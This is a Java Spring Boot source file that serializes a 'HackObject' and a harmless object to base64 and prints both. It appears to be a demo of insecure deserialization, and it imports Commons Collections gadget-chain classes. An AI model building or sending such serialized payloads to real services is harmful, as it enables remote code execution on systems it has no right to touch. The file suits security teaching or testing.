package org.example.server;

import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.example.server.serialize.HackObject;
import org.example.server.serialize.SimpleObject;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.util.Base64;
import java.util.Collections;
import java.util.HashMap;
import java.util.Map;

@SpringBootApplication
public class ServerApplication {

	public static void main(String[] args) throws IOException {
		HackObject hackObj = new HackObject();
		SimpleObject simpleObj = new SimpleObject("Hello, this is a simple message");

		String hackBase64 = getBase64ForObject(hackObj);
		String simpleBase64 = getBase64ForObject(simpleObj);

		System.out.println("HackObject base64: " + hackBase64);
		System.out.println("SimpleObject base64: " + simpleBase64);


		SpringApplication.run(ServerApplication.class, args);
	}

	private static String getBase64ForObject(Object obj) throws IOException {
		ByteArrayOutputStream baos = new ByteArrayOutputStream();
		ObjectOutputStream out = new ObjectOutputStream(baos);
		out.writeObject(obj);
		out.close();
        return Base64.getEncoder().encodeToString(baos.toByteArray());
	}
}
